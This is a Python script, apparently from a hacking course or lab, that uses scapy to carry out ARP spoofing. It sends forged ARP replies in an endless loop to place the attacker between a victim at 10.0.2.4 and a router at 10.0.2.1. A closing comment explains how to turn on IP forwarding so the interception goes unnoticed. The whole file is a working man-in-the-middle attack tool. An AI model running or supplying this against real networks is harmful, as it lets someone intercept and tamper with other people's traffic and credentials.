#!/usr/bin/env python3

import scapy.all as scapy
import time

def get_mac(ip):
    '''
    This function will get the MAC Address using arp request
    '''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') 

    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0] # Stored [answered_list, unanswered_list]

    return answered_list[0][1].hwsrc # The answered_list stores (packet sent, answer), so use [1] to indicate the answer element 


def arp_spoof(target_ip, spoof_ip):
    '''
    This function will spoof the target ip by sending arp response
    '''
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # 'op=1' is a request, 'op=2' is a response
    # scapy.ls(packet) # list out the field available for scapy.ARP
    scapy.send(packet, verbose=False)


# To allow the program to keep spoofing the victim and the router
counter = 0
while True:
    arp_spoof('10.0.2.4', '10.0.2.1') # Tell the victim that I am the router
    arp_spoof('10.0.2.1', '10.0.2.4') # Tell the router that I am the victim
    counter += 2
    print(f'\r[+] Packets sent: {counter}', end='')
    time.sleep(2)


# Try running this 'echo 1 > /proc/sys/net/ipv4/ip_forward' to allow the victim machine to connect to the internet